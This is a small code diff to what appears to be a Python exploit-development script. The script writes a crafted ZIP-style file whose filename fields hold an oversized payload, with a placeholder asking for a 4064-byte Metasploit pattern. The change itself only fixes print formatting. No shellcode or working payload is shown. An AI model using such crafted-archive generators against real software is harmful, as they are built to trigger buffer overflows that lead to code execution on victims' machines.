@@ -39,11 +39,12 @@ eofcdf_header = (
 
 payload = "paste your 4064 byte metasploit pattern here"
 payload = payload + ".txt"
+payload_len = len(payload)
 
-print("Size : " + len(payload) + "\n")
-print("Removing old {filename} file\n".format(filename=filename))
+print("Size : {length} bytes".format(length=payload_len))
+print("Removing old {filename} file".format(filename=filename))
 remove(filename)
-print("Creating new {filename} file\n".format(filename=filename))
+print("Creating new {filename} file".format(filename=filename))
 with open(filename, "w") as f:
     file_content = ldf_header + payload + cdf_header + payload + eofcdf_header
     f.write(file_content)
